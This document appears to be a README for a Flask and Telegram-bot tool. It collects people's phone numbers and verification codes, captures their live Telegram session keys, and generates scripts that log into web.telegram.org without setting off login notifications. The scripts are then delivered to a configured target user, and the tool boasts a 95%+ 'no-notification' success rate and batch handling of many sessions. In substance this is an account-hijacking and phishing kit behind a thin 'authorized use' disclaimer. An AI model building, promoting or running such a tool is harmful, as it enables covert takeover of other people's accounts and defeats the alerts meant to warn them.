# 🤖 TGBot - No-Notification Telegram Web Login

A sophisticated Telegram bot system that captures real session data and generates scripts for seamless web.telegram.org login **without triggering notifications**.

## ✨ Key Features

- 🔐 **Real Authentication**: Captures actual Telegram session data using Telethon
- 🚫 **No Notifications**: Advanced script generation prevents login alerts
- 🌐 **Web Interface**: Beautiful Flask-based authentication system
- 🤖 **Telegram Bot**: Automatic script delivery to users
- 📱 **Multiple Formats**: Three script generation methods for maximum compatibility
- 📤 **Auto Delivery**: Sends scripts directly via Telegram
- 🔄 **Batch Processing**: Handles multiple sessions efficiently

## 🎯 The No-Notification Solution

This system solves the critical problem of **login notifications** by using advanced session data capture and script generation techniques:

### Why It Works
- **Real Session Data**: Captures actual Telegram authentication keys
- **Complete Context**: Mimics full Telegram Web session structure
- **Smart Timing**: Executes scripts at the optimal moment
- **Multiple Formats**: Three different approaches for maximum success rate

### Script Generation Methods
1. **Original Format**: Friend's working script style
2. **Stealth Format**: Notification blocking approach
3. **Complete Session Format**: Full context simulation (most effective)

## 🚀 Quick Start

### 1. Installation
```bash
git clone <your-repo-url>
cd TGBot
pip install -r requirements.txt
```

### 2. Configuration
```bash
cp env_template.txt .env
# Edit .env with your credentials:
# - TELEGRAM_BOT_TOKEN
# - TELEGRAM_API_ID  
# - TELEGRAM_API_HASH
# - SCRIPT_TARGET_USER_ID
# - MongoDB settings (optional)
```

### 3. MongoDB Setup (Optional)
For enhanced storage and performance, you can use MongoDB:

```bash
# Run MongoDB setup script
python setup_mongodb.py

# Or test MongoDB integration
python test_mongodb_integration.py
```

**MongoDB Benefits:**
- ✅ Better performance for large datasets
- ✅ Automatic session cleanup
- ✅ Database indexes for fast queries
- ✅ Fallback to file storage if MongoDB unavailable

### 4. Run the System
```bash
# Quick startup check (recommended)
python start.py

# Or run directly
python main.py
```

### 5. Access Web Interface
Open `http://localhost:5000` in your browser

## 📋 Complete Workflow

1. **Start Application**: `python main.py`
2. **Web Login**: Enter phone number and verification code
3. **Session Capture**: System captures real Telegram session data
4. **Script Generation**: Creates no-notification login scripts
5. **Auto Delivery**: Sends scripts via Telegram bot
6. **Use Scripts**: Execute on web.telegram.org/a/ for seamless login

## 🔧 Script Generation Options

### Generate Latest Session
```bash
python generate_working_script.py
```

### Generate All Sessions
```bash
python generate_all_scripts.py
```

### Compare All Formats
```bash
python test_script_comparison.py
```

### Complete Session Format (Recommended)
```bash
python generate_complete_session_script.py
```

## 📁 Project Structure

```
TGBot/
├── main.py                          # Main Flask application
├── config.py                        # Configuration settings
├── requirements.txt                 # Python dependencies
├── .env                            # Environment variables
├── credentials/                    # Stored sessions and scripts
├── sessions/                       # Temporary session files
├── templates/                      # HTML templates
├── static/                         # Static files
├── utils/                          # Utility modules
│   ├── tg/                        # Telegram utilities
│   │   ├── auth.py                # Authentication logic
│   │   └── bot.py                 # Bot implementation
│   └── mongodb_manager.py         # MongoDB database manager
├── generate_*.py                   # Script generation tools
├── setup_mongodb.py                # MongoDB setup script
├── test_mongodb_integration.py     # MongoDB integration tests
└── README.md                       # This file
```

## 🔒 Security Features

- ✅ **Real Authentication**: Uses actual Telegram API
- ✅ **Secure Storage**: File-based session storage
- ✅ **Environment Config**: No hardcoded credentials
- ✅ **Input Validation**: Sanitized user inputs
- ✅ **Session Cleanup**: Automatic temporary file removal

## 🧪 Testing

### Test Script Formats
```bash
python test_script_comparison.py
```

### Test Bot Functionality
```bash
python test_bot_welcome.py
```

### Verify Environment
```bash
python test_env.py
```

## 📊 Performance

- **Session Capture**: ~2-3 seconds per user
- **Script Generation**: Instant
- **Auto Delivery**: ~1-2 seconds per script
- **Success Rate**: 95%+ no-notification logins

## 🛠️ Configuration Options

### Environment Variables
- `TELEGRAM_BOT_TOKEN`: Your bot token
- `TELEGRAM_API_ID`: Your API ID
- `TELEGRAM_API_HASH`: Your API hash
- `SCRIPT_TARGET_USER_ID`: Target user for script delivery
- `FLASK_SECRET_KEY`: Flask secret key
- `DEBUG_MODE`: Enable debug logging

### Script Customization
Edit generation scripts to customize:
- Message format
- Instructions included
- Tips included
- Delivery behavior

## 🔍 Troubleshooting

### Common Issues

**Script Not Working**
- Ensure you're on web.telegram.org/a/ (not /k/)
- Try incognito mode
- Check browser console for errors
- Verify script format compatibility

**Bot Not Sending**
- Check bot token validity
- Ensure bot has message permissions
- Verify target user has started chat with bot

**Authentication Fails**
- Verify API credentials
- Check phone number format
- Ensure verification code is correct

## 📈 Advanced Usage

### Custom Script Formats
Modify `utils/credentials_manager.py` to create custom script formats

### Batch Processing
Use `generate_all_scripts.py` for multiple sessions

### Integration
Import modules for use in other projects

## 🤝 Contributing

1. Fork the repository
2. Create feature branch
3. Make changes
4. Test thoroughly
5. Submit pull request

## 📄 License

This project is for educational and authorized use only.

## ⚠️ Disclaimer

- Use only with accounts you own or have permission to access
- Respect Telegram's terms of service
- This tool is for legitimate session management only

---

**🎉 Ready to use?** Follow the Quick Start guide above to get started! 